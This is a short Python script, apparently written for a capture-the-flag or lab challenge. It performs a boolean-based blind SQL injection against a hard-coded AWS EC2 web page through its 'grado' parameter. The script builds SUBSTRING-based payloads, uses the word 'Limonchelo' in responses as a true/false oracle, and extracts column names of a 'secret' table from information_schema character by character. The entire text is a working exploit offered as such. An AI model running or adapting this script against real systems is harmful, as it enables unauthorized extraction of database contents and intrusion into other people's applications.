import requests

url = "http://ec2-13-50-235-55.eu-north-1.compute.amazonaws.com:83/index.php"
charset = "abcdefghijklmnopqrstuvwxyz0123456789_"

def blind_string(query):
    result = ""
    for pos in range(1, 50):
        found = False
        for c in charset:
            payload = f"30' AND SUBSTRING(({query}),{pos},1)='{c}'-- -"
            r = requests.get(url, params={"grado": payload})
            if "Limonchelo" in r.text:
                result += c
                found = True
                break
        if not found:
            break
    return result

# Sacar columnas de la tabla 'secret'
columns = []
for i in range(0, 10):  # máx 10 columnas
    col = blind_string(f"SELECT column_name FROM information_schema.columns WHERE table_schema='licores' AND table_name='secret' LIMIT {i},1")
    if not col:
        break
    columns.append(col)
    print(f"[+] Columna {i}: {col}")

print("[+] Columnas encontradas:", columns)
